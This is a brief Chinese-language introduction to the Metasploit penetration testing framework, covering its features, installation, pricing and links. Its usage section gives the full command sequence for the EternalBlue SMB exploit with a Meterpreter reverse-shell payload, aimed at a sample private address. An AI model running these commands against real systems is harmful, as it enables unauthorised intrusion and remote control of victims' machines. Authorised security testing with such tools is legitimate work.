# Metasploit

Metasploit 是世界上使用最广泛的渗透测试框架，用于验证漏洞的可利用性和管理安全评估。

## 主要特点

- **漏洞利用库** - 数千个即用的漏洞利用
- **Payload 生成** - 创建自定义 Payload
- **后渗透** - 保持访问和横向移动
- **辅助模块** - 扫描、模糊测试等
- **Meterpreter** - 高级 Payload 完全控制
- **报告** - 生成专业报告

## 快速开始

安装 Metasploit：

```bash
# Kali Linux（预装）
msfconsole

# 其他系统
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

基本用法：

```bash
# 启动 Metasploit
msfconsole

# 搜索漏洞利用
search type:exploit platform:windows smb

# 使用漏洞利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

## 为什么选择 Metasploit？

- **行业标准** - 全球安全专业人员使用
- **全面** - 最大的漏洞利用数据库
- **Rapid7 支持** - 企业级支持可用
- **社区** - 庞大社区和定期更新

## 定价

- **Framework** - 免费开源
- **Pro** - 商业版本，附加功能

## 相关资源

- [官方网站](https://www.metasploit.com/)
- [文档](https://docs.metasploit.com/)
- [GitHub 仓库](https://github.com/rapid7/metasploit-framework)
